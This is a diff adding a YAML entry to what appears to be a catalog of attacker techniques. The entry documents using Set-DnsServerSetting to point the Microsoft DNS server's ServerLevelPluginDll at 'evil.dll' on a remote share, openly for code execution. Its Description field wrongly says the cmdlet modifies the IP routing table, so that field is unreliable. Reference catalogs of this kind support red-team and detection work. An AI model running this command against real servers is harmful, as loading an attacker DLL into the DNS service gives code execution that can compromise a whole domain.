@@ -1,0 +1,25 @@
+---
+Name: Set-DnsServerSetting
+Description: Modifies an entry or entries in the IP routing table
+Updated: 2026-03-28
+Toolsets:
+  - Server
+  - CIMSession
+Commands:
+  - Command: |
+      $srv = Get-DnsServerSetting -CimSession $s -Verbose -All
+      $srv.ServerLevelPluginDll = "\\10.0.0.123\Share\evil.dll"
+      Set-DnsServerSetting -InputObject $srv -CimSession $s -Verbose
+    Description: Load DLL in the Microsoft DNS server
+    Usecases:
+      - Load malicious DLL in the Microsoft DNS server to obtain code execution
+    Function: Execute
+    Comments:
+      - 'Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'
+      - 'PowerShell Module: `DnsServer`'
+    MitreAttack:
+Resources:
+Detections:
+Contributors:
+    - Name: Arris Huijgen
+      Handle: bitsadmin
